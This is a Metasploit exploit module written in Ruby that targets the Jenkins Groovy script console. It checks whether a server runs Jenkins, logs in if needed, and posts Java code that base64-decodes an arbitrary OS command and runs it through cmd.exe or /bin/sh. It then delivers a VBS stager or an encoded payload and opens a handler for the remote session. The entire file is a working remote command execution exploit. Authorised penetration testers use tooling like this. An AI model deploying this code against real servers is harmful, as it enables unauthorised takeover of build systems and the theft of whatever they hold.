##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Jenkins Script-Console Java Execution',
			'Description'    => %q{
					This module uses the Jenkins Groovy script console to execute
				OS commands using Java.
			},
			'Author'	=>
				[
					'Spencer McIntyre',
					'jamcut'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'DefaultOptions' =>
				{
					'WfsDelay' => '10',
				},
			'References'     =>
				[
					['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console']
				],
			'Targets'		=>
				[
					['Windows',  {'Arch' => ARCH_X86, 'Platform' => 'win'}],
					['Unix',     {'Arch' => ARCH_CMD, 'Platform' => 'unix', 'Payload' => {'BadChars' => "\x22"}}],
				],
			'DisclosureDate' => 'Jan 18 2013',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('USERNAME', [ false, 'The username to authenticate as', '' ]),
				OptString.new('PASSWORD', [ false, 'The password for the specified username', '' ]),
				OptString.new('PATH', [ true, 'The path to jenkins', '/jenkins' ]),
			], self.class)
	end

	def check
		res = send_request_cgi({'uri' => "#{datastore['PATH']}/login"})
		if res and res.headers.include?('X-Jenkins')
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def http_send_command(cmd, opts = {})
		res = send_request_cgi({
			'method'    => 'POST',
			'uri'       => datastore['PATH'] + '/script',
			'cookie'    => @cookie,
			'vars_post' =>
				{
					'script' => java_craft_runtime_exec(cmd),
					'Submit' => 'Run'
				}
		})
		if not (res and res.code == 200)
			fail_with(Exploit::Failure::Unknown, 'Failed to execute the command.')
		end
	end

	def java_craft_runtime_exec(cmd)
		decoder = Rex::Text.rand_text_alpha(5, 8)
		decoded_bytes = Rex::Text.rand_text_alpha(5, 8)
		cmd_array = Rex::Text.rand_text_alpha(5, 8)
		jcode =  "sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\n"
		jcode << "byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"

		jcode << "String [] #{cmd_array} = new String[3];\n"
		if target['Platform'] == 'win'
			jcode << "#{cmd_array}[0] = \"cmd.exe\";\n"
			jcode << "#{cmd_array}[1] = \"/c\";\n"
		else
			jcode << "#{cmd_array}[0] = \"/bin/sh\";\n"
			jcode << "#{cmd_array}[1] = \"-c\";\n"
		end
		jcode << "#{cmd_array}[2] = new String(#{decoded_bytes}, \"UTF-8\");\n"
		jcode << "Runtime.getRuntime().exec(#{cmd_array});\n"
		jcode
	end

	def execute_command(cmd, opts = {})
		http_send_command("#{cmd}")
	end

	def exploit
		print_status('Checking access to the script console')
		res = send_request_cgi({'uri' => "#{datastore['PATH']}/script"})
		if not (res and res.code)
			fail_with(Exploit::Failure::Unknown)
		end

		sessionid = 'JSESSIONID=' << res.headers['set-cookie'].split('JSESSIONID=')[1].split('; ')[0]
		@cookie = "#{sessionid}"

		if res.code != 200
			print_status('Logging in...')
			res = send_request_cgi({
				'method'    => 'POST',
				'uri'       => datastore['PATH'] + '/j_acegi_security_check',
				'cookie'    => @cookie,
				'vars_post' =>
					{
						'j_username' => Rex::Text.uri_encode(datastore['USERNAME'], 'hex-normal'),
						'j_password' => Rex::Text.uri_encode(datastore['PASSWORD'], 'hex-normal'),
						'Submit'     => 'log in'
					}
			})

			if not (res and res.code == 302) or res.headers['Location'] =~ /loginError/
				fail_with(Exploit::Failure::NoAccess, 'login failed')
			end
		else
			print_status('No authentication required, skipping login...')
		end

		case target['Platform']
		when 'win'
			print_status("#{rhost}:#{rport} - Sending VBS stager...")
			execute_cmdstager({:linemax => 2049})

		when 'unix'
			print_status("#{rhost}:#{rport} - Sending payload...")
			http_send_command("#{payload.encoded}")
		end

		handler
	end
end
